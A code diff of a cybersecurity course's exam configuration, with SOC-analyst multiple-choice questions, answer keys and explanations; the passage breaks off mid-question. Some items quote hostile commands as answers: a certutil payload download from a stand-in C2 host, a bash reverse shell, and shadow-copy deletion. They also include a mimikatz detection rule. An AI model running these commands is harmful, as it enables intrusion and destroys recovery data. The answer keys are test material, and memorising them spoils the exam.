@@ -219,7 +219,8 @@ If this rule triggers, the severity is automatically elevated to **High (P2)** b
         quiz: {
           id: 'quiz_mod_1',
           title: 'Module 1 Evaluation: SOC Fundamentals & Defensive Telemetry',
-          passing_score: 70,
+          passing_score: 80,
+          duration_minutes: 20,
           total_questions: 20,
           token_bounty: 150,
           questions: [
@@ -551,9 +552,11 @@ Suspicious Process Alert
           }
         ],
         quiz: {
+          
           id: 'quiz_mod_2',
           title: 'Module 2 Evaluation: Threat Detection & ATT&CK',
-          passing_score: 70,
+          passing_score: 80,
+          duration_minutes: 20,
           total_questions: 20,
           token_bounty: 150,
           questions: [
@@ -874,9 +877,11 @@ sha256sum /mnt/forensics/workstation_04_ram.raw > workstation_04_ram.sha256
           }
         ],
         quiz: {
+          
           id: 'quiz_mod_3',
           title: 'Module 3 Evaluation: Incident Containment & Forensics',
-          passing_score: 70,
+          passing_score: 80,
+          duration_minutes: 20,
           total_questions: 20,
           token_bounty: 150,
           questions: [
@@ -1148,8 +1153,8 @@ sha256sum /mnt/forensics/workstation_04_ram.raw > workstation_04_ram.sha256
       id: 'exam_soc_cert',
       title: 'RedKross Certified SOC Analyst (RCSA) — Final Comprehensive Examination',
       passing_score: 80, // PRD strict 80% passing threshold
-      duration_minutes: 45,
-      total_questions: 10,
+      duration_minutes: 60,
+      total_questions: 50,
       credential_title: 'RedKross Certified SOC Analyst (RCSA)',
       credential_type: 'Certification',
       skills_validated: [
@@ -1160,139 +1165,659 @@ sha256sum /mnt/forensics/workstation_04_ram.raw > workstation_04_ram.sha256
         'Incident Containment & Evidence Defensibility'
       ],
       questions: [
-        {
-          id: 'fe_1',
-          text: 'An analyst detects PowerShell executing with the flag "-EncodedCommand" followed by a long base64 string. What is the analyst\'s first decoding and analysis step?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_1', text: 'Decode the UTF-16LE base64 string to inspect the plaintext script logic without executing it', is_correct: true },
-            { id: 'f_opt_2', text: 'Run the command on their local SOC workstation to see what happens', is_correct: false },
-            { id: 'f_opt_3', text: 'Delete the PowerShell executable from the infected machine', is_correct: false },
-            { id: 'f_opt_4', text: 'Ignore it because PowerShell is a legitimate administrative tool', is_correct: false }
-          ],
-          explanation: 'PowerShell -EncodedCommand expects UTF-16LE encoded strings. Defenders decode this safely to extract the adversary\'s payload parameters.'
-        },
-        {
-          id: 'fe_2',
-          text: 'Which Windows Security Event ID signifies the installation of a new Windows Service (Persistence T1543.003)?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_5', text: 'Event ID 7045 (System log) / Event ID 4697 (Security log)', is_correct: true },
-            { id: 'f_opt_6', text: 'Event ID 1102 (The audit log was cleared)', is_correct: false },
-            { id: 'f_opt_7', text: 'Event ID 4624 (Logon success)', is_correct: false },
-            { id: 'f_opt_8', text: 'Event ID 4720 (User account created)', is_correct: false }
-          ],
-          explanation: 'Event ID 7045 / 4697 logs whenever a new service is installed, frequently used by adversaries for persistent SYSTEM execution.'
-        },
-        {
-          id: 'fe_3',
-          text: 'What is the primary indicator of a "Pass-the-Hash" attack in Windows authentication logs?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_9', text: 'Logon Type 3 with NTLM authentication using high-privilege domain administrator credentials between internal workstations', is_correct: true },
-            { id: 'f_opt_10', text: 'A user entering their password incorrectly 3 times', is_correct: false },
-            { id: 'f_opt_11', text: 'A computer rebooting without warning', is_correct: false },
-            { id: 'f_opt_12', text: 'A network cable being unplugged', is_correct: false }
-          ],
-          explanation: 'Pass-the-Hash relies on NTLM network authentication (Logon Type 3) using stolen hashes without knowing the cleartext password.'
-        },
-        {
-          id: 'fe_4',
-          text: 'What does the term "Living off the Land" (LotL) refer to in defensive cybersecurity?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_13', text: 'Using legitimate, pre-installed operating system binaries (LOLBins) to carry out malicious actions', is_correct: true },
-            { id: 'f_opt_14', text: 'Operating data centers using renewable solar energy', is_correct: false },
-            { id: 'f_opt_15', text: 'Conducting physical penetration tests against agricultural facilities', is_correct: false },
-            { id: 'f_opt_16', text: 'Recompiling open-source kernels from source code', is_correct: false }
-          ],
-          explanation: 'LOLBins (e.g. certutil, bitsadmin, msiexec) allow attackers to execute commands and download tools while evading simple signature-based detection.'
-        },
-        {
-          id: 'fe_5',
-          text: 'Which defensive metric calculates the duration between an attacker\'s initial compromise and when the SOC identifies the intrusion?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_17', text: 'MTTD (Mean Time to Detect) / Dwell Time', is_correct: true },
-            { id: 'f_opt_18', text: 'MTTR (Mean Time to Repair)', is_correct: false },
-            { id: 'f_opt_19', text: 'RTO (Recovery Time Objective)', is_correct: false },
-            { id: 'f_opt_20', text: 'SLA (Service Level Agreement)', is_correct: false }
-          ],
-          explanation: 'Dwell Time / MTTD is the critical measure of how long an adversary remains undetected within an organization.'
-        },
-        {
-          id: 'fe_6',
-          text: 'When investigating suspected credential dumping from LSASS memory, which Sysmon Event ID tracks abnormal access to lsass.exe?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_21', text: 'Sysmon Event ID 10 (ProcessAccess)', is_correct: true },
-            { id: 'f_opt_22', text: 'Sysmon Event ID 1 (ProcessCreate)', is_correct: false },
-            { id: 'f_opt_23', text: 'Sysmon Event ID 7 (ImageLoaded)', is_correct: false },
-            { id: 'f_opt_24', text: 'Sysmon Event ID 13 (RegistryEvent)', is_correct: false }
-          ],
-          explanation: 'Sysmon Event ID 10 alerts when an unprivileged or suspicious process opens a handle to lsass.exe with PROCESS_VM_READ access rights.'
-        },
-        {
-          id: 'fe_7',
-          text: 'What is the role of an Indicator of Compromise (IOC) in threat hunting?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_25', text: 'Forensic artifacts (such as file hashes, malicious IPs, or domain names) that provide evidence of security intrusions', is_correct: true },
-            { id: 'f_opt_26', text: 'A marketing metric for SOC revenue generation', is_correct: false },
-            { id: 'f_opt_27', text: 'A hardware standard for network router cables', is_correct: false },
-            { id: 'f_opt_28', text: 'A software license key for SIEM deployment', is_correct: false }
-          ],
-          explanation: 'IOCs are forensic signatures used to search logs and telemetry across enterprise fleets for confirmed adversarial presence.'
-        },
-        {
-          id: 'fe_8',
-          text: 'In the NIST SP 800-61 Incident Handling Lifecycle, what phase immediately follows "Containment, Eradication & Recovery"?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_29', text: 'Post-Incident Activity / Lessons Learned', is_correct: true },
-            { id: 'f_opt_30', text: 'Preparation', is_correct: false },
-            { id: 'f_opt_31', text: 'Detection and Analysis', is_correct: false },
-            { id: 'f_opt_32', text: 'Legal Prosecution', is_correct: false }
-          ],
-          explanation: 'Post-Incident Activity (Lessons Learned) analyzes what happened, why it happened, and how to improve defenses to prevent recurrence.'
-        },
-        {
-          id: 'fe_9',
-          text: 'Why must a SOC maintain an out-of-band communication channel (e.g. signal or separate phone bridge) during active ransomware incidents?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_33', text: 'Because internal corporate email and messaging systems may be compromised and monitored by the threat actor', is_correct: true },
-            { id: 'f_opt_34', text: 'To save on long-distance phone charges', is_correct: false },
-            { id: 'f_opt_35', text: 'Because corporate firewalls always block voice calls automatically', is_correct: false },
-            { id: 'f_opt_36', text: 'Because cloud tools do not work during weekends', is_correct: false }
-          ],
-          explanation: 'Adversaries who achieve domain dominance often read internal incident emails to anticipate defender containment steps.'
-        },
-        {
-          id: 'fe_10',
-          text: 'What is the purpose of the "Traffic Light Protocol" (TLP) in threat intelligence sharing?',
-          type: 'single_choice',
-          points: 10,
-          options: [
-            { id: 'f_opt_37', text: 'To facilitate and control the sharing of sensitive information by specifying who can view and distribute the data (TLP:RED, AMBER, GREEN, CLEAR)', is_correct: true },
-            { id: 'f_opt_38', text: 'To adjust the speed of network routers during peak traffic hours', is_correct: false },
-            { id: 'f_opt_39', text: 'To indicate which analysts are available for shift changes', is_correct: false },
-            { id: 'f_opt_40', text: 'To benchmark internet connection bandwidth', is_correct: false }
-          ],
-          explanation: 'TLP labels (RED, AMBER+STRICT, AMBER, GREEN, CLEAR) inform recipients how widely threat intelligence can be disseminated.'
-        }
+          {
+            id: 'fe_1',
+            text: 'During a memory forensics investigation of a compromised Domain Controller, you observe code injection into lsass.exe. Which specific Windows API hook is most commonly weaponized by credential-siphoning tools to extract plaintext credentials from Wdigest memory?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_1_a', text: 'Secur32!LsaEnumerateLogonSessions and ReadProcessMemory targeting the Kerberos/Wdigest SSP DLLs', is_correct: true },
+              { id: 'f_opt_1_b', text: 'NtQuerySystemInformation hooked to intercept PID enumeration across the session', is_correct: false },
+              { id: 'f_opt_1_c', text: 'SetWindowsHookEx targeting WH_KEYBOARD_LL in user32.dll for keystroke capture', is_correct: false },
+              { id: 'f_opt_1_d', text: 'VirtualProtectEx to mark all physical RAM pages as executable and writable', is_correct: false }
+            ],
+            explanation: 'Mimikatz accesses LSASS process memory via OpenProcess with PROCESS_VM_READ and invokes LsaEnumerateLogonSessions to traverse live Security Support Provider (SSP) credential pools.'
+          },
+          {
+            id: 'fe_2',
+            text: 'Which Windows Security Event ID specifically signifies the installation of a new Windows Service (MITRE ATT&CK T1543.003)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_2_a', text: 'Event ID 1102 (The audit log was cleared)', is_correct: false },
+              { id: 'f_opt_2_b', text: 'Event ID 7045 in System log or Event ID 4697 in Security log', is_correct: true },
+              { id: 'f_opt_2_c', text: 'Event ID 4624 (Successful network logon)', is_correct: false },
+              { id: 'f_opt_2_d', text: 'Event ID 4720 (A user account was created)', is_correct: false }
+            ],
+            explanation: 'Event ID 7045 (System log via Service Control Manager) and Event ID 4697 (Security log when enabled in audit policy) explicitly record service installation events.'
+          },
+          {
+            id: 'fe_3',
+            text: 'An adversary executes a Golden Ticket attack. Which domain-wide secret is required to forge this Kerberos Ticket Granting Ticket (TGT)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_3_a', text: 'The Domain Administrator\'s plaintext password', is_correct: false },
+              { id: 'f_opt_3_b', text: 'The public key certificate of the root Active Directory Certificate Services (AD CS)', is_correct: false },
+              { id: 'f_opt_3_c', text: 'The domain krbtgt account\'s NTLM hash or AES-256 master key', is_correct: true },
+              { id: 'f_opt_3_d', text: 'The local machine SID of the target workstation', is_correct: false }
+            ],
+            explanation: 'Golden Tickets require the krbtgt account key (NTLM hash or AES128/256 key) to sign and encrypt Kerberos TGTs with arbitrary group memberships and lifetimes.'
+          },
+          {
+            id: 'fe_4',
+            text: 'In Wireshark, which display filter isolates DNS tunneling beacons characterized by unusually long subdomain queries transmitting encoded base64/hex data?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_4_a', text: 'ip.proto == 6 && tcp.port == 53', is_correct: false },
+              { id: 'f_opt_4_b', text: 'udp.port == 53 && frame.len < 64', is_correct: false },
+              { id: 'f_opt_4_c', text: 'dns.count.answers > 10', is_correct: false },
+              { id: 'f_opt_4_d', text: 'dns && dns.flags.response == 0 && dns.qry.name.len > 50', is_correct: true }
+            ],
+            explanation: 'DNS exfiltration and C2 tunneling encode data within DNS request labels (subdomains), resulting in high query name length (dns.qry.name.len > 50) and TXT/A record anomalies.'
+          },
+          {
+            id: 'fe_5',
+            text: 'What is the primary forensic difference between Kerberoasting and AS-REP Roasting in Active Directory environments?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_5_a', text: 'Kerberoasting requests TGS tickets for SPN accounts; AS-REP Roasting targets accounts where \'Do not require Kerberos preauthentication\' is configured', is_correct: true },
+              { id: 'f_opt_5_b', text: 'Kerberoasting requires Domain Admin privileges, whereas AS-REP Roasting requires no credentials at all', is_correct: false },
+              { id: 'f_opt_5_c', text: 'Kerberoasting only works against Linux servers joining AD; AS-REP Roasting only targets Azure AD', is_correct: false },
+              { id: 'f_opt_5_d', text: 'Kerberoasting decrypts the NTDS.dit database directly over SMB port 445', is_correct: false }
+            ],
+            explanation: 'Kerberoasting abuses valid domain credentials to request Service Tickets (TGS) for accounts with ServicePrincipalNames. AS-REP Roasting does not need valid credentials if DONT_REQ_PREAUTH is set.'
+          },
+          {
+            id: 'fe_6',
+            text: 'You suspect an adversary used Process Hollowing (T1055.012). Which sequence of native Windows API calls is indicative of this technique?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_6_a', text: 'CreateFile -> ReadFile -> WriteFile -> CloseHandle', is_correct: false },
+              { id: 'f_opt_6_b', text: 'CreateProcess(CREATE_SUSPENDED) -> NtUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory -> SetThreadContext -> ResumeThread', is_correct: true },
+              { id: 'f_opt_6_c', text: 'OpenProcess -> VirtualAllocEx -> QueueUserAPC -> SleepEx', is_correct: false },
+              { id: 'f_opt_6_d', text: 'LoadLibraryA -> GetProcAddress -> CreateRemoteThread', is_correct: false }
+            ],
+            explanation: 'Process Hollowing spawns a legitimate binary suspended, unmaps its original executable image from memory, allocates and writes malicious shellcode, updates thread context, and resumes execution.'
+          },
+          {
+            id: 'fe_7',
+            text: 'When investigating a suspected Ransomware execution on Linux, which volatile artifact provides immediate evidence of open network sockets and active unlinked file descriptors?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_7_a', text: '/etc/resolv.conf and /var/log/lastlog', is_correct: false },
+              { id: 'f_opt_7_b', text: '/etc/shadow and /etc/passwd', is_correct: false },
+              { id: 'f_opt_7_c', text: '/proc/<pid>/fd/ and /proc/<pid>/net/', is_correct: true },
+              { id: 'f_opt_7_d', text: '/home/*/.bash_history only', is_correct: false }
+            ],
+            explanation: 'The Linux procfs filesystem (/proc/<pid>/fd/) exposes live file descriptors even for deleted binaries and open socket connections (/proc/<pid>/net/).'
+          },
+          {
+            id: 'fe_8',
+            text: 'Under the Order of Volatility (RFC 3227), which source of digital evidence must be acquired FIRST during live host triage?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_8_a', text: 'Hard drive raw block images (dd / E01 of /dev/sda)', is_correct: false },
+              { id: 'f_opt_8_b', text: 'Archival backup tapes and optical media', is_correct: false },
+              { id: 'f_opt_8_c', text: 'Remote syslog server historical indices', is_correct: false },
+              { id: 'f_opt_8_d', text: 'CPU cache, registers, and Physical RAM', is_correct: true }
+            ],
+            explanation: 'RFC 3227 Order of Volatility: 1. CPU registers/cache; 2. Routing tables, ARP cache, process table, kernel stats, RAM; 3. Temporary file systems; 4. Disk; 5. Remote logging; 6. Backups.'
+          },
+          {
+            id: 'fe_9',
+            text: 'Which Zeek (Bro) log file specifically records all SSL/TLS handshakes, JA3/JA3S client fingerprints, and negotiated cipher suites?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_9_a', text: 'ssl.log', is_correct: true },
+              { id: 'f_opt_9_b', text: 'conn.log', is_correct: false },
+              { id: 'f_opt_9_c', text: 'dns.log', is_correct: false },
+              { id: 'f_opt_9_d', text: 'http.log', is_correct: false }
+            ],
+            explanation: 'Zeek ssl.log records TLS certificate exchanges, JA3 client fingerprints, server names (SNI), and handshake validation status.'
+          },
+          {
+            id: 'fe_10',
+            text: 'An attacker uses Living off the Land Binaries (LOLBINs) to download a payload using certutil.exe. Which command syntax exemplifies this behavior?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_10_a', text: 'certutil.exe -dump -v C:\\certs\\root.crt', is_correct: false },
+              { id: 'f_opt_10_b', text: 'certutil.exe -urlcache -split -f http://malicious.c2/stage2.exe C:\\ProgramData\\payload.exe', is_correct: true },
+              { id: 'f_opt_10_c', text: 'certutil.exe -verify -silent C:\\Windows\\System32\\ntoskrnl.exe', is_correct: false },
+              { id: 'f_opt_10_d', text: 'certutil.exe -backupkey C:\\backup', is_correct: false }
+            ],
+            explanation: 'certutil -urlcache -split -f forces certutil to retrieve a remote URL and store it locally, bypassing naïve application execution filters.'
+          },
+          {
+            id: 'fe_11',
+            text: 'Which MITRE ATT&CK Enterprise Matrix tactic describes the adversary\'s attempt to maintain their foothold across system reboots and credential cycles?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_11_a', text: 'Defense Evasion (TA0005)', is_correct: false },
+              { id: 'f_opt_11_b', text: 'Lateral Movement (TA0008)', is_correct: false },
+              { id: 'f_opt_11_c', text: 'Persistence (TA0003)', is_correct: true },
+              { id: 'f_opt_11_d', text: 'Exfiltration (TA0010)', is_correct: false }
+            ],
+            explanation: 'Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions.'
+          },
+          {
+            id: 'fe_12',
+            text: 'What does a sudden surge of Windows Event ID 4625 followed immediately by Event ID 4624 for the same user account from a single source workstation indicate?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_12_a', text: 'Active Directory Database Corruption', is_correct: false },
+              { id: 'f_opt_12_b', text: 'DDoS SYN Flood on Domain Controller port 88', is_correct: false },
+              { id: 'f_opt_12_c', text: 'A user successfully resetting their PIN via Self-Service Portal', is_correct: false },
+              { id: 'f_opt_12_d', text: 'Successful Password Spray or Brute Force Attack', is_correct: true }
+            ],
+            explanation: 'Event ID 4625 denotes failed logon attempts. Multiple failures followed by a single 4624 (successful logon) from the same source is the hallmark of brute-force or dictionary cracking.'
+          },
+          {
+            id: 'fe_13',
+            text: 'In Snort/Suricata signature development, what does the \'content\' modifier \'nocase; offset:0; depth:4;\' accomplish when matching a packet payload?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_13_a', text: 'Searches case-insensitively across the first 4 bytes of the payload payload buffer starting from offset 0', is_correct: true },
+              { id: 'f_opt_13_b', text: 'Skips the first 4 packets and ignores case on the TCP flags', is_correct: false },
+              { id: 'f_opt_13_c', text: 'Encrypts the packet payload using a 4-byte XOR key', is_correct: false },
+              { id: 'f_opt_13_d', text: 'Drops the packet if the payload length exceeds 4 bytes', is_correct: false }
+            ],
+            explanation: 'In Snort, offset defines where to start searching relative to payload start, depth specifies how many bytes to inspect, and nocase enforces case-insensitive comparison.'
+          },
+          {
+            id: 'fe_14',
+            text: 'What key forensic artifact in the Windows Registry records the execution timestamp and launch count of GUI programs run by interactive users?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_14_a', text: 'HKLM\\SYSTEM\\CurrentControlSet\\Services', is_correct: false },
+              { id: 'f_opt_14_b', text: 'UserAssist key in NTUSER.DAT (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist)', is_correct: true },
+              { id: 'f_opt_14_c', text: 'HKLM\\SAM\\Domains\\Account\\Users', is_correct: false },
+              { id: 'f_opt_14_d', text: 'HKLM\\HARDWARE\\DEVICEMAP', is_correct: false }
+            ],
+            explanation: 'The UserAssist registry key uses ROT13 encoding to log executable launches, execution counts, and last execution timestamps for applications initiated via Windows Explorer.'
+          },
+          {
+            id: 'fe_15',
+            text: 'Which command line syntax executes a volume shadow copy deletion commonly observed in Ransomware kill-chains (MITRE T1490)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_15_a', text: 'cipher /w:C:\\', is_correct: false },
+              { id: 'f_opt_15_b', text: 'diskpart /clean /all', is_correct: false },
+              { id: 'f_opt_15_c', text: 'vssadmin.exe delete shadows /all /quiet', is_correct: true },
+              { id: 'f_opt_15_d', text: 'chkdsk C: /f /r', is_correct: false }
+            ],
+            explanation: 'vssadmin.exe delete shadows /all /quiet is the classic command used by ransomware operators to inhibit system recovery prior to encrypting storage volumes.'
+          },
+          {
+            id: 'fe_16',
+            text: 'In Linux auditd logs, what does a \'type=EXECVE\' entry containing \'argc=3 a0="bash" a1="-i" a2=">& /dev/tcp/10.0.0.1/4444 0>&1"\' reveal?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_16_a', text: 'A routine system administrative backup routine over NFS', is_correct: false },
+              { id: 'f_opt_16_b', text: 'A corrupted DNS cache lookup loop', is_correct: false },
+              { id: 'f_opt_16_c', text: 'A package update installation via apt-get', is_correct: false },
+              { id: 'f_opt_16_d', text: 'An interactive Bash reverse shell established to remote IP 10.0.0.1 on port 4444', is_correct: true }
+            ],
+            explanation: 'bash -i >& /dev/tcp/ip/port 0>&1 redirects stdin, stdout, and stderr to a network socket, establishing an interactive TCP reverse shell.'
+          },
+          {
+            id: 'fe_17',
+            text: 'What critical security measure prevents NTLM relay attacks against Active Directory Certificate Services (AD CS / PetitPotam)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_17_a', text: 'Enforcing Extended Protection for Authentication (EPA) and requiring HTTPS on AD CS web enrollment interfaces', is_correct: true },
+              { id: 'f_opt_17_b', text: 'Disabling DNS scavenging across domain zones', is_correct: false },
+              { id: 'f_opt_17_c', text: 'Enabling SMBv1 on domain members', is_correct: false },
+              { id: 'f_opt_17_d', text: 'Allowing anonymous LDAP binds', is_correct: false }
+            ],
+            explanation: 'EPA (Extended Protection for Authentication) and disabling HTTP endpoints or enforcing SSL channel binding prevents attackers from relaying captured NTLM auth to AD CS web endpoints.'
+          },
+          {
+            id: 'fe_18',
+            text: 'Which Sigma rule detection condition matches when EventID is 1 (Process Create) and the process command line contains both \'mimikatz\' and \'sekurlsa\' regardless of capitalization?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_18_a', text: 'selection1 and (selection2 or selection3)', is_correct: false },
+              { id: 'f_opt_18_b', text: 'EventID: 1 and CommandLine|contains|all: [\'mimikatz\', \'sekurlsa\']', is_correct: true },
+              { id: 'f_opt_18_c', text: 'EventID == 4688 and ProcessName != \'cmd.exe\'', is_correct: false },
+              { id: 'f_opt_18_d', text: 'not (CommandLine == \'powershell.exe\')', is_correct: false }
+            ],
+            explanation: 'Sigma\'s CommandLine|contains|all modifier requires all listed substring items to exist within the target field, matching the command line pattern.'
+          },
+          {
+            id: 'fe_19',
+            text: 'What is the main utility of Shimcache (AppCompatCache) in Windows incident response triage?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_19_a', text: 'Determining the exact number of times a program was launched by every logged-in user', is_correct: false },
+              { id: 'f_opt_19_b', text: 'Decrypting BitLocker volume encryption keys', is_correct: false },
+              { id: 'f_opt_19_c', text: 'Proving that a specific executable binary was present on disk and executed by the operating system', is_correct: true },
+              { id: 'f_opt_19_d', text: 'Recovering unencrypted SSL session keys from RAM', is_correct: false }
+            ],
+            explanation: 'Shimcache tracks application compatibility metadata. While it does not record user context or precise execution counts on modern Windows, it proves execution and file existence.'
+          },
+          {
+            id: 'fe_20',
+            text: 'Which HTTP response header explicitly prevents cross-origin data leaks by instructing modern browsers to block rendering within an <iframe>?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_20_a', text: 'Access-Control-Allow-Origin: *', is_correct: false },
+              { id: 'f_opt_20_b', text: 'Strict-Transport-Security: max-age=31536000', is_correct: false },
+              { id: 'f_opt_20_c', text: 'Server: Apache/2.4.41', is_correct: false },
+              { id: 'f_opt_20_d', text: 'X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors \'none\'', is_correct: true }
+            ],
+            explanation: 'X-Frame-Options: DENY and CSP frame-ancestors prevent clickjacking by disallowing framing across any parent browsing context.'
+          },
+          {
+            id: 'fe_21',
+            text: 'During a network packet capture analysis, you notice TCP packets with SYN and FIN flags set simultaneously. What does this signify?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_21_a', text: 'An illegal/abnormal TCP flag combination commonly generated by port scanners (e.g. Nmap SYN/FIN scan) to evade naive stateful inspection', is_correct: true },
+              { id: 'f_opt_21_b', text: 'Standard TCP keep-alive probe', is_correct: false },
+              { id: 'f_opt_21_c', text: 'Normal HTTP/2 multi-stream multiplexing', is_correct: false },
+              { id: 'f_opt_21_d', text: 'A gracefully closed BGP peering session', is_correct: false }
+            ],
+            explanation: 'SYN (synchronize) and FIN (finish) are mutually exclusive states in RFC 793. Their co-occurrence indicates scanner probing or firewall evasion attempts.'
+          },
+          {
+            id: 'fe_22',
+            text: 'What is the primary indicator of DLL Search Order Hijacking (T1574.001) in Sysmon Event ID 7 (Image Loaded) telemetry?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_22_a', text: 'A DLL loaded with signature status \'Microsoft Windows Verified\'', is_correct: false },
+              { id: 'f_opt_22_b', text: 'A known system DLL (e.g. version.dll) loaded from a user-writable directory (e.g. AppData or Temp) rather than System32', is_correct: true },
+              { id: 'f_opt_22_c', text: 'Any DLL smaller than 10 kilobytes', is_correct: false },
+              { id: 'f_opt_22_d', text: 'Kernel drivers loaded during cold boot', is_correct: false }
+            ],
+            explanation: 'DLL hijacking relies on placing a malicious DLL in a directory prioritized before System32 in the search order, visible when system DLL names load from user-writable paths.'
+          },
+          {
+            id: 'fe_23',
+            text: 'Which memory structure in the Windows kernel holds pointers to loaded drivers, making it a critical target for rootkit DKOM (Direct Kernel Object Manipulation)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_23_a', text: 'MBR partition table', is_correct: false },
+              { id: 'f_opt_23_b', text: 'BIOS CMOS RAM', is_correct: false },
+              { id: 'f_opt_23_c', text: 'PsLoadedModuleList linked list', is_correct: true },
+              { id: 'f_opt_23_d', text: 'Local Security Authority database file', is_correct: false }
+            ],
+            explanation: 'PsLoadedModuleList is a doubly-linked list of KLDR_DATA_TABLE_ENTRY structures. Rootkits unhook their node from this list to become invisible to standard driver enumerators.'
+          },
+          {
+            id: 'fe_24',
+            text: 'An incident responder finds that an attacker created an SSH key in /root/.ssh/authorized_keys with \'from="192.168.1.50"\'. What does this \'from\' directive enforce?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_24_a', text: 'Sends an email notification to that IP whenever the key is used', is_correct: false },
+              { id: 'f_opt_24_b', text: 'Forces SSH traffic to be mirrored to 192.168.1.50 for monitoring', is_correct: false },
+              { id: 'f_opt_24_c', text: 'Disables root login completely', is_correct: false },
+              { id: 'f_opt_24_d', text: 'Restricts the use of this public key to logins originating strictly from the specified IP address 192.168.1.50', is_correct: true }
+            ],
+            explanation: 'In OpenSSH authorized_keys, the from="pattern" option restricts public key authentication exclusively to matching source IP addresses or hostnames.'
+          },
+          {
+            id: 'fe_25',
+            text: 'Which SIEM correlation query structure best detects a Kerberos Diamond Ticket attack, where the attacker uses a compromised Ticket Granting Service (TGS) request?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_25_a', text: 'Correlating Event ID 4768 (TGT Request) having genuine PAC signatures with subsequent Event ID 4769 (Service Ticket) requests featuring modified user SIDs', is_correct: true },
+              { id: 'f_opt_25_b', text: 'Searching for Event ID 1102 log clearances on workstations', is_correct: false },
+              { id: 'f_opt_25_c', text: 'Counting total ping ICMP packets on the perimeter router', is_correct: false },
+              { id: 'f_opt_25_d', text: 'Filtering for DHCP lease expirations', is_correct: false }
+            ],
+            explanation: 'Diamond Ticket attacks request a legitimate TGT from the KDC and modify the PAC using the krbtgt key, differing from Golden Tickets which generate TGTs without prior 4768 events.'
+          },
+          {
+            id: 'fe_26',
+            text: 'In web application security, how does an attacker exploit an Insecure Deserialization vulnerability in Java (e.g. Apache Commons Collections)?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_26_a', text: 'By sending a SQL query with 1=1 in the URL parameter', is_correct: false },
+              { id: 'f_opt_26_b', text: 'By submitting craftily serialized object gadget chains that invoke arbitrary method execution upon readObject() deserialization', is_correct: true },
+              { id: 'f_opt_26_c', text: 'By overloading the web server with 50,000 concurrent HTTP GET requests', is_correct: false },
+              { id: 'f_opt_26_d', text: 'By modifying the User-Agent header to \'curl\'', is_correct: false }
+            ],
+            explanation: 'Java deserialization vulnerabilities exploit gadget chains where custom readObject() implementations invoke reflective calls (InvokerTransformer, TemplatesImpl) leading to RCE.'
+          },
+          {
+            id: 'fe_27',
+            text: 'What does the presence of the string \'$Recycle.Bin\' combined with an alternate data stream (e.g. \':Zone.Identifier\') in NTFS metadata reveal?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_27_a', text: 'The user\'s browser bookmarks', is_correct: false },
+              { id: 'f_opt_27_b', text: 'The hard drive serial number', is_correct: false },
+              { id: 'f_opt_27_c', text: 'The security zone and URL origin from which a deleted file was originally downloaded from the Internet', is_correct: true },
+              { id: 'f_opt_27_d', text: 'A corrupted master file table (MFT) record', is_correct: false }
+            ],
+            explanation: 'Zone.Identifier is an NTFS Alternate Data Stream (ADS) appended by browsers (Mark of the Web / MOTW). If the file is moved to the Recycle Bin, this stream preserves the source URL.'
+          },
+          {
+            id: 'fe_28',
+            text: 'Which Linux command lists all processes that have deleted files still mapped open in memory, frequently used to identify concealed malware?',
+            type: 'single_choice',
+            points: 2,
+            options: [
+              { id: 'f_opt_28_a', text: 'ls -la /tmp', is_correct: false },
+              { id: 'f_opt_28_b', text: 'df -h', is_correct: false },
+              { id: 'f_opt_28_c', text: 'uname -r', is_correct: false },
+              { id: 'f_opt_28_d', text: 'lsof +L1 or lsof | grep deleted', is_correct: true }
+            ],
+            explanation: 'lsof +L1 identifies open files with a link count of zero (files unlinked from the filesystem but still kept alive in memory by running processes).'
+          },
+          {
+            id: 'fe_29',
+            text: 'What is the cryptographic danger of using static Initialization Vectors (IV) with AES in CBC mode across multiple messages?',
